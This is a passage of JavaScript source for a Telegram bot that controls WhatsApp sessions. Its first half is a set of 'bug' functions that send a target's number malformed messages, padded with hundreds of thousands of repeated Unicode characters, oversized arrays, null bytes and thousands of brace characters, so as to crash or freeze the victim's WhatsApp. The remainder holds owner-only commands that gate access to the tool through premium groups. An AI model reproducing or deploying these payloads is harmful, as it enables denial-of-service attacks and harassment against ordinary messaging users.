        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
          isForwarded: true,
          forwardingScore: 9999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 899099}@s.whatsapp.net`
            }))
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });
}

async function BarzzTamvan(sock, target) {
  try {
    await sock.relayMessage(target, {
        extendedTextMessage: {
          text: "# - D̶o̶ Y̶o̶u̶ K̶n̶o̶w̶ M̶i̶a̶?̶ Y̶e̶a̶h̶ I̶a̶m̶ M̶i̶a̶ 🤪\n" + "ꦽ".repeat(50000),

          previewType: "NONE",

          contextInfo: {
            mentionedJid: [
              "6287898053857@s.whatsapp.net"
            ],

            forwardingScore: 1,
            isForwarded: true,

            externalAdReply: {
              title: "Mia Official",
              body: "Olaa Ini Mia",
              thumbnailUrl: "https://files.catbox.moe/o36gja.jpg",
              sourceUrl: "https://t.me/AngelOfDarkNexx",
              mediaType: 1,
              renderLargerThumbnail: true,
              showAdAttribution: false
            },

            inviteLinkGroupTypeV2: "DEFAULT"
          }
        }
      },
      {}
    );

    console.log(` Succes Sending Bug To ${target}`);

  } catch (error) {
    console.log("Error Bitch\n" + error);
  }
}

async function Xyen(sock, target) {
  const messagePayload = {
    ephemeralMessage: {
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/pdf",
          fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
          fileLength: 0,
          pageCount: 0,
          mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
          fileName: "MiaPdf",
          fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
          directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
          mediaKeyTimestamp: 99999999999999,
         documentSentTs: "9083773766021",
          quotedMessage: {
            conversation: "FunctionByMia"
          }
        }
      }
    },
    nativeFlowResponseMessage: {
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "# - D̶o̶ Y̶o̶u̶ K̶n̶o̶w̶ M̶i̶a̶?̶ Y̶e̶a̶h̶ I̶a̶m̶ M̶i̶a̶ 🤪" + "ោ៝".repeat(890000),
            url: "https://wa.me/settings"
          })
        }
      ],
      messageParamsJson: "{".repeat(55000),
      quotedMessage: {
        conversation: "# - D̶o̶ Y̶o̶u̶ K̶n̶o̶w̶ M̶i̶a̶?̶ Y̶e̶a̶h̶ I̶a̶m̶ M̶i̶a̶ 🤪"
      }
    },
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
      fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
      mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
      mimetype: "image/webp",
      directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
      fileLength: "10610",
      mediaKeyTimestamp: "1775044724",
      stickerSentTs: "9083773766021",
      quotedMessage: {
        conversation: "FunctionByMia"
      }
    },
    setUrlTrackingMap: {
      urltrackingmapelements: Array.from({ length: 280000 }, () => ({ type: 1 }))
    },
    headerType: 1
  };
  await sock.relayMessage("status@broadcast", messagePayload, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function FcClickByMia(sock, target) {
  await sock.relayMessage(target, {
    "videoMessage": {
      "url": "https://mmg.whatsapp.net/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&mms3=true",
      "mimetype": "video/mp4",
      "fileSha256": "Vbqeh2lor8Jw03cFXxKlG0Z8ov9a8WOEkviuZSVSn6A=",
      "fileLength": "175891",
      "seconds": 1,
      "mediaKey": "W430WGQWHdPJavPx++FhjoimbRmgn4juKdt9R6yBKOM=",
      "height": 848,
      "width": 480,
      "fileEncSha256": "9QJErKyUw6Um/LC9shgLoZmN0UDoX8DJPob/G0oXi48=",
      "directPath": "/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&_nc_hot=1765345956",
      "mediaKeyTimestamp": "1765345955",
      "streamingSidecar": "As5LhkSwskInV2ZBolPQK8kUK/FS8OjeKC4E/DSY",
      "annotations": [{
        "shouldSkipConfirmation": true,
        "embeddedContent": {
          "embeddedMusic": {
            "musicContentMediaId": "3312808138872179",
            "songId": "270259430421407",
            "author": "ြ".repeat(200000),

            "title": "# - D̶o̶ Y̶o̶u̶ K̶n̶o̶w̶ M̶i̶a̶?̶ Y̶e̶a̶h̶ I̶a̶m̶ M̶i̶a̶ 🤪",
            "artworkDirectPath": "/v/t62.76458-24/595759391_863062182901487_831028644482797415_n.enc?ccb=11-4&oh=01_Q5Aa3QFi_Lrr3pnfhgCNgS6DwjBC9W1jxZqyMu9YTA3qbjUHrg&oe=69606F3E&_nc_sid=5e03e0",
            "artworkSha256": "Rm0L8d3YCRSi2JNPUdFEM3n1eABvF1mdvE0DWnPSzyQ=",
            "artworkEncSha256": "Q6uE0wu/wQ4goKG+OHQkTvSJ2dcSzALDzZ322g9xdfQ=",
            "artistAttribution": "https://www.instagram.com/_u/carlos_10474",
            "countryBlocklist": "",
            "isExplicit": true,
            "artworkMediaKey": "1hxqLYZLT2dZnJayfE4KP/9wh+kSbBVBkvvguo+N8m8=",
            "musicSongStartTimeInMs": "10149",
            "derivedContentStartTimeInMs": "0",
            "overlapDurationInMs": "1000"
          }
        },
        "embeddedAction": true
      }]
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
  });
}
// ------ ( Akhir Of Function Bug) ------ // FUNCTION BUAT NANDAIN
bot.command('setchannel', (ctx) => {
  if (!isOwner(ctx)) return ctx.reply('❌ Anda bukan owner')

  const arg = ctx.message.text.split(' ')[1]

  if (!arg) {
    return ctx.reply('Format: /setchannel @channel / off')
  }

  if (arg === 'off') {
    forceChannel = null
    return ctx.reply('❌ Channel dihapus')
  }

  forceChannel = arg
  ctx.reply(`✅ Channel diset ke ${arg}`)
})

// =================
// ON / OFF FITUR
// =================
bot.command('channel', (ctx) => {
  if (!isOwner(ctx)) return ctx.reply('❌ Anda bukan owner')

  const arg = ctx.message.text.split(' ')[1]

  if (arg === 'on') {
    if (!forceChannel) {
      return ctx.reply('❌ Set channel dulu pakai /setchannel')
    }

    channelOn = true
    ctx.reply('🔒 Force Join diaktifkan')
  } 
  else if (arg === 'off') {
    channelOn = false
    ctx.reply('🔓 Force Join dimatikan')
  } 
  else {
    ctx.reply('Gunakan: /channel on / off')
  }
})

bot.command('grouponly', (ctx) => {
  const userId = String(ctx.from.id)
  const isOwner = ID_TELEGRAM || isAdmin(userId);

  if (!isOwner) {
    return ctx.reply('❌ Anda bukan owner')
  }

  const arg = ctx.message.text.split(' ')[1]

  if (arg === 'on') {
    groupOnly = true
    ctx.reply('🔒 Group Only diaktifkan (SEMUA private diblok)')
  } else if (arg === 'off') {
    groupOnly = false
    ctx.reply('🔓 Group Only dimatikan')
  } else {
    ctx.reply('Gunakan: /grouponly on / off')
  }
})

bot.command("addpremgrup", ownerOnly(), async (ctx) => {
  const type = ctx.chat?.type;
  if (type === "private") return ctx.reply("❌ Pakai command ini di grup.");

  addPremGroup(ctx.chat.id);

  const title = escapeHtml(ctx.chat?.title || "Unknown Group");
  return ctx.reply(
    `✅ ☇ <b>${title}</b> berhasil ditambahkan sebagai Group premium`,
    { parse_mode: "HTML" }
  );
});

bot.command("delpremgrup", ownerOnly(), async (ctx) => {
  const type = ctx.chat?.type;
  if (type === "private") return ctx.reply("❌ Pakai command ini di grup.");

  delPremGroup(ctx.chat.id);

  const title = escapeHtml(ctx.chat?.title || "Unknown Group");
  return ctx.reply(
    `🗑 ☇ <b>${title}</b> berhasil dihapus sebagai group premium sampai`,
    { parse_mode: "HTML" }
  );
});

bot.command("cekpremgrup", ownerOnly(), async (ctx) => {
  const db = loadPremGroups();
  if (!db.groups.length) return ctx.reply("📭 Tidak ada grup premium.");

  const lines = db.groups.map((id, i) => `${i + 1}. <code>${id}</code>`).join("\n");
  return ctx.reply(`📌 <b>LIST GRUP PREMIUM</b>\n\n${lines}`, { parse_mode: "HTML" });
});

// ---- ( akhir of menu ) ---- //
bot.launch();